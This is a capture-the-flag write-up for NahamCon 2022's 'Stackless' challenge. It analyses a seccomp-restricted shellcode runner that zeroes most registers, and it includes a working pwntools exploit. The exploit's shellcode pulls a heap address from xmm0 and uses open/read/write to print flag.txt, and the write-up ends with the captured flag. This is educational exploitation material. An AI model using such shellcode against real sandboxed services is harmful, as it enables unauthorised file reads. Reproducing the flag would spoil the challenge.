# NahamCon CTF 2022

## Stackless

> Oh no my stack!!!! 
>
> Author: @M_alpha#3534
>
> [`stackless.c`](stackless.c) [`stackless`](stackless) [`Makefile`](Makefile) [`Dockerfile`](Dockerfile)

Tags: _pwn_ _x86-64_ _shellcode_ _seccomp_ 


## Summary

Classic shellcode runner constrained by seccomp with _common_ registers reset for the lulz.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

All mitigations in place.  Finally.

> BTW, you get all this sweet sweet security for free with `gcc -O2`.


### Source Included

```c
    signal(SIGALRM, timeout);
    alarm(60);
    sandbox();

    __asm__ volatile (".intel_syntax noprefix\n"
                      "mov r15, %[addr]\n"
                      "xor rax, rax\n"
                      "xor rbx, rbx\n"
                      "xor rcx, rcx\n"
                      "xor rdx, rdx\n"
                      "xor rsp, rsp\n"
                      "xor rbp, rbp\n"
                      "xor rsi, rsi\n"
                      "xor rdi, rdi\n"
                      "xor r8, r8\n"
                      "xor r9, r9\n"
                      "xor r10, r10\n"
                      "xor r11, r11\n"
                      "xor r12, r12\n"
                      "xor r13, r13\n"
                      "xor r14, r14\n"
                      "jmp r15\n" ".att_syntax"::[addr] "r"(code));
```

Since this is just a standard shellcode runner, I'm not going to include the entire source here--just submit shellcode and it runs it for you; simple as that.

Above are the constraints.

First, `sandbox` is called to setup a seccomp filter.  A more compact way to examine this is with `seccomp-tools`:

```bash
# seccomp-tools dump ./stackless
Shellcode length
1
Shellcode
1
 line  CODE  JT   JF      K
=================================
 0000: 0x20 0x00 0x00 0x00000004  A = arch
 0001: 0x15 0x00 0x0b 0xc000003e  if (A != ARCH_X86_64) goto 0013
 0002: 0x20 0x00 0x00 0x00000000  A = sys_number
 0003: 0x35 0x00 0x01 0x40000000  if (A < 0x40000000) goto 0005
 0004: 0x15 0x00 0x08 0xffffffff  if (A != 0xffffffff) goto 0013
 0005: 0x15 0x06 0x00 0x00000000  if (A == read) goto 0012
 0006: 0x15 0x05 0x00 0x00000001  if (A == write) goto 0012
 0007: 0x15 0x04 0x00 0x00000002  if (A == open) goto 0012
 0008: 0x15 0x03 0x00 0x00000003  if (A == close) goto 0012
 0009: 0x15 0x02 0x00 0x0000003c  if (A == exit) goto 0012
 0010: 0x15 0x01 0x00 0x000000e7  if (A == exit_group) goto 0012
 0011: 0x06 0x00 0x00 0x80000000  return KILL_PROCESS
 0012: 0x06 0x00 0x00 0x7fff0000  return ALLOW
 0013: 0x06 0x00 0x00 0x00000000  return KILL
```

We're limited to `read`, `write`, `open`, `close`, `exit`, and `exit_group` syscalls.

The second constraint is actually more of a dick move--the _common_ registers are reset (zeroed).  Including `r15` since a 3-byte instruction is prepended to your submitted shellcode to reset `r15` before your code starts to run.

With `rsp` zeroed and PIE enabled, we have no idea where in memory we can use as a scratchpad to read in and emit the flag from.

However, our lulzy challenge author was not thorough and left a number of _uncommon_ registered set.  From `gdb` use `i all-r`.

`xmm0` looked most promising:

```
gef➤  i r xmm0
xmm0           {
  v4_float = {0x41000000, 0x0, 0x0, 0x0},
  v2_double = {0x0, 0x0},
  v16_int8 = {0x10, 0xa4, 0x55, 0x55, 0x55, 0x55, 0x0, 0x0, 0xe0, 0xab, 0xf8, 0xf7, 0xff, 0x7f, 0x0, 0x0},
  v8_int16 = {0xa410, 0x5555, 0x5555, 0x0, 0xabe0, 0xf7f8, 0x7fff, 0x0},
  v4_int32 = {0x5555a410, 0x5555, 0xf7f8abe0, 0x7fff},
  v2_int64 = {0x55555555a410, 0x7ffff7f8abe0},
  uint128 = 0x7ffff7f8abe0000055555555a410
}
```

Specifically `v2_int64 = {0x55555555a410, 0x7ffff7f8abe0},`.

Comparing to my memory map:

```
gef➤  vmmap
[ Legend:  Code | Heap | Stack ]
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /pwd/datajerk/nahamconctf2022/stackless/stackless
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /pwd/datajerk/nahamconctf2022/stackless/stackless
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /pwd/datajerk/nahamconctf2022/stackless/stackless
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /pwd/datajerk/nahamconctf2022/stackless/stackless
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /pwd/datajerk/nahamconctf2022/stackless/stackless
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
```

It looks like that first location is in the next page after the heap and the heap is `rw`--exactly what we need for a scratchpad.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./stackless', checksec=False)

if args.REMOTE:
    p = remote('challenge.nahamcon.com', 30375)
else:
    p = process(binary.path)

shellcode = asm(f'''
movq r15, xmm0
sub r15, 0x1000

lea rdi, [rip+flag]
mov rax, {constants.SYS_open}
syscall

mov rdi, rax
mov rsi, r15
mov rdx, 100
mov rax, {constants.SYS_read}
syscall

mov rdx, rax
mov rdi, {constants.STDOUT_FILENO}
mov rax, {constants.SYS_write}
syscall
hlt

flag: .asciz "flag.txt"
''')

if not args.REMOTE: print(disasm(shellcode))

p.sendlineafter(b'length\n', str(len(shellcode)).encode())
p.sendlineafter(b'code\n', shellcode)
flag = p.recvline().strip().decode()
p.close()
print(flag)
```

The `shellcode` should be fairly obvious:

1. Get the location from `xmm0` that is in the page after the heap and subtract `0x1000` from it.
2. Open `flag.txt`
3. Read `flag.txt` into heap.
4. Write to stdout.


Output:

```bash
# ./exploit.py REMOTE=1
[+] Opening connection to challenge.nahamcon.com on port 30831: Done
[*] Closed connection to challenge.nahamcon.com port 30831
flag{2e5016f202506a14de5e8d2c7285adfa}
```
